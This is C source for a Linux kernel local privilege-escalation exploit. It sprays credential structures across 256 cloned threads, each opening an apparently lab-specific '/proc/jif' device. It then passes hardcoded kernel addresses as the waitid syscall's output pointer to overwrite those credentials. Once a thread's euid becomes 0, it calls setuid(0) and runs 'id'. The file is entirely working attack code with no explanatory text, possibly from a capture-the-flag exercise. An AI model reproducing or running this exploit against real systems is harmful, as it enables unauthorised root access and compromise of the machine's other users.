#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <errno.h>
#include <asm/unistd_64.h>


void set_cpu_affinity(){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0,&mask);
    if (sched_setaffinity(0,sizeof(mask),&mask))
        puts("set single CPU failed");
    return;
}

void spray_cred()
{
	set_cpu_affinity();
	int fd = open("/proc/jif", O_RDWR);
	close(fd);
	int success_flag = 1;
	while(1)
	{
		if(geteuid() == 0)
		{
			puts("[+] Sucessfully!");
			 success_flag=0;
            //printf("[*]pid:%d euid:%d uid:%d\n",getpid(),geteuid(),getuid());   
            setuid(0);
            printf("[*]pid:%d euid:%d uid:%d\n",getpid(),geteuid(),getuid());
            system("id");
		}   
		if(!success_flag){
            sleep(100000);
        }
    usleep(100000);
	}
}

int main()
{
 	pid_t pid;
 	void* stack;
 	int i;

 	for(i = 0; i<0x100; i++)
 	{
 		stack = malloc(0x1000);
 		pid = clone(spray_cred, stack, CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | CLONE_SIGHAND, NULL);
 		if(pid == -1)
 		{
 			perror("[-] clone failed...");
 			exit(-1);
 		}
 	}

 	size_t start_addr = 0xffff88000d3b0004;
 	size_t end_addr = 0xffff88000d3b0ff4;
 	size_t ptr;
 	size_t step = 0x10;

 	for(ptr = start_addr; ptr <= end_addr; ptr += step)
 	{	
 		// any child process
 		syscall(SYS_waitid, P_ALL, 0, ptr, WEXITED|WNOHANG|__WNOTHREAD, NULL);
 	}
 	puts("[-] Failed to exploit...");
 	return 0;
}